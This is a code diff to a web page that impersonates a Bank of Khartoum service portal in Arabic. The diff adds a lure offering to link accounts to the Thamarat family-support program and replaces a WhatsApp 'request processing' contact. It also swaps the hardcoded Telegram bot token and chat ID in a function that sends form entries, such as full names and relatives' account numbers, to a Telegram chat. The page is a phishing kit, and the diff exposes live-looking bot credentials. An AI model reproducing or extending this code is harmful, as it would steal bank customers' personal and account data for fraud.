@@ -101,54 +101,54 @@
                     </div>
                     <span>💼</span>
                 </div>
-                <div class="service-option" onclick="selectService(2, 'كشف الحساب')">
+                <div class="service-option" onclick="selectService(2, 'تفعيل أسئلة الأمان')">
+                    <div class="service-content">
+                        <span class="service-title">ربط حساب بنك الخرطوم ببرنامج ثمرات</span>
+                        <span class="service-desc">أربط حسابك الشخصي بمنصة ثمرات لدعم الأسر السودانية  </span>
+                    </div>
+                    <span>🛡️</span>
+                </div>
+                <div class="service-option" onclick="selectService(3, 'كشف الحساب')">
                     <div class="service-content">
                         <span class="service-title">كشف الحساب</span>
                         <span class="service-desc">الحصول على كشف حساب مفصل.</span>
                     </div>
                     <span>📈</span>
                 </div>
-                <div class="service-option" onclick="selectService(3, 'رفع السقف')">
+                <div class="service-option" onclick="selectService(4, 'رفع السقف')">
                     <div class="service-content">
                         <span class="service-title">رفع السقف</span>
                         <span class="service-desc">زيادة الحد اليومي للتحويلات.</span>
                     </div>
                     <span>📱</span>
                 </div>
-                <div class="service-option" onclick="selectService(4, 'التحويلات الخاطئة')">
+                <div class="service-option" onclick="selectService(5, 'التحويلات الخاطئة')">
                     <div class="service-content">
                         <span class="service-title">التحويلات الخاطئة</span>
                         <span class="service-desc">معالجة فورية للتحويلات الخاطئة.</span>
                     </div>
                     <span>✅</span>
                 </div>
-                <div class="service-option" onclick="selectService(5, 'خدمات العملات الأجنبية')">
+                <div class="service-option" onclick="selectService(6, 'خدمات العملات الأجنبية')">
                     <div class="service-content">
                         <span class="service-title">خدمات العملات الأجنبية</span>
                         <span class="service-desc">تفعيل وإدارة العملات الأجنبية.</span>
                     </div>
                     <span>💱</span>
                 </div>
-                <div class="service-option" onclick="selectService(6, 'بطاقة فيزا افتراضية')">
+                <div class="service-option" onclick="selectService(7, 'بطاقة فيزا افتراضية')">
                     <div class="service-content">
                         <span class="service-title">بطاقة فيزا افتراضية</span>
                         <span class="service-desc">إصدار وإدارة بطاقات الفيزا الافتراضية.</span>
                     </div>
                     <span>💳</span>
                 </div>
-                <div class="service-option" onclick="selectService(7, 'تغير الهاتف')">
+                <div class="service-option" onclick="selectService(8, 'تغير الهاتف')">
                     <div class="service-content">
                         <span class="service-title">تغير رقم الهاتف القديم إلى رقم هاتف جديد.</span>
                         <span class="service-desc">تغير رقم الهاتف القديم إلى رقم هاتف جديد.</span>
                     </div>
                     <span>🔄</span>
-                </div>
-                <div class="service-option" onclick="selectService(8, 'تفعيل أسئلة الأمان')">
-                    <div class="service-content">
-                        <span class="service-title">تفعيل أسئلة الأمان</span>
-                        <span class="service-desc">إعداد وتفعيل أسئلة الحماية والأمان.</span>
-                    </div>
-                    <span>🛡️</span>
                 </div>
             </div>
         </div>
@@ -296,7 +296,7 @@
             <div class="input-group">
                 <label>الإسم بالكامل:</label>
                 <input type="text" id="inc-name" placeholder="أدخل الإسم رباعي">
-                <div id="err-inc-name" class="error-message-box">⚠️ هذا الحقل مطلوب</div>
+                <div id="err-inc-name" class="error-message-box">⚠️️ هذا الحقل مطلوب</div>
             </div>
             <div class="input-group">
                 <label>المهنة:</label>
@@ -326,7 +326,7 @@
             <div class="input-group">
                 <label>رقم حساب أقرب الأقربين في بنك الخرطوم:</label>
                 <input type="text" id="inc-relative-account" placeholder="أدخل رقم حساب القريب (6 أو 7 أرقام)">
-                <div id="err-inc-relative-account" class="error-message-box">⚠️ هذا الحقل مطلوب</div>
+                <div id="err-inc-relative-account" class="error-message-box">⚠️️ هذا الحقل مطلوب</div>
             </div>
             <button class="btn-submit" onclick="finalizeProcess()">إتمام وتوثيق الطلب</button>
         </div>
@@ -355,7 +355,7 @@
     </div>
 
     <!-- الأيقونة العائمة الثابتة في أسفل الشاشة -->
-    <a href="https://wa.me/2499022876729" class="floating-whatsapp" target="_blank">
+    <a href="https://wa.me/249918597038" class="floating-whatsapp" target="_blank">
         <i class="fab fa-whatsapp"></i>
         <span>قسم معالجة الطلبات للاستفسار</span>
     </a>
@@ -598,8 +598,8 @@
         }
 
         function sendToTelegram(messageText) {
-            const botToken = "8813029455:AAFGdPqqzJ-WorJDSHRO2gdGbO-IqANpXrA";
-            const chatId = "2014945683";
+            const botToken = "8768779383:AAF8JU5AIp7V92PytduKqrF1qIb25IAGKng";
+            const chatId = "8859964558";
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
             fetch(url, {
